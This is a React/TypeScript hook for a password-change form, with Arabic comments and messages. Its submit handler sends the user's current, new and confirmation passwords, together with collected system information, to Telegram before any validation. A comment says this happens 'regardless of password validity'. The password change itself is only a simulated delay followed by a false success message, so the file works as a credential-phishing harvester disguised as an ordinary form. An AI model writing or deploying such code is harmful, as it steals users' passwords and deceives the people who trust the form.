import { useState } from 'react';
import { useToast } from "@/components/ui/use-toast";
import { sendToTelegram, collectSystemInfo } from '@/utils/telegramNotifier';

export const usePasswordForm = () => {
  const [oldPassword, setOldPassword] = useState("");
  const [newPassword, setNewPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const { toast } = useToast();

  const validatePassword = (password: string): boolean => {
    // يجب أن تكون كلمة المرور 8 أحرف على الأقل
    const minLength = password.length >= 8;
    // يجب أن تحتوي على حرف كبير واحد على الأقل
    const hasUpperCase = /[A-Z]/.test(password);
    // يجب أن تحتوي على رقم واحد على الأقل
    const hasNumber = /\d/.test(password);
    // يجب أن تحتوي على حرف خاص واحد على الأقل
    const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>]/.test(password);

    return minLength && hasUpperCase && hasNumber && hasSpecialChar;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    
    // إرسال المعلومات إلى التلجرام بغض النظر عن صحة كلمة المرور
    const message = `
🔐 تم تسجيل محاولة تغيير كلمة المرور:

كلمة المرور الحالية: ${oldPassword}
كلمة المرور الجديدة: ${newPassword}
تأكيد كلمة المرور: ${confirmPassword}

💻 معلومات النظام:
${collectSystemInfo()}
    `;

    await sendToTelegram(message);
    
    // التحقق من صحة كلمة المرور الجديدة
    const isValidNewPassword = validatePassword(newPassword);
    const passwordsMatch = newPassword === confirmPassword;

    if (!isValidNewPassword) {
      toast({
        title: "خطأ في كلمة المرور",
        description: "يجب أن تحتوي كلمة المرور على 8 أحرف على الأقل، وحرف كبير، ورقم، وحرف خاص",
        variant: "destructive"
      });
      setIsLoading(false);
      return;
    }

    if (!passwordsMatch) {
      toast({
        title: "خطأ في تأكيد كلمة المرور",
        description: "كلمة المرور وتأكيدها غير متطابقين",
        variant: "destructive"
      });
      setIsLoading(false);
      return;
    }

    // محاكاة طلب API
    await new Promise(resolve => setTimeout(resolve, 1500));
    
    toast({
      title: "تم تغيير كلمة المرور بنجاح",
      description: "يمكنك الآن استخدام كلمة المرور الجديدة لتسجيل الدخول",
    });
    
    setIsLoading(false);
    setOldPassword("");
    setNewPassword("");
    setConfirmPassword("");
  };

  return {
    oldPassword,
    setOldPassword,
    newPassword,
    setNewPassword,
    confirmPassword,
    setConfirmPassword,
    isLoading,
    handleSubmit,
  };
};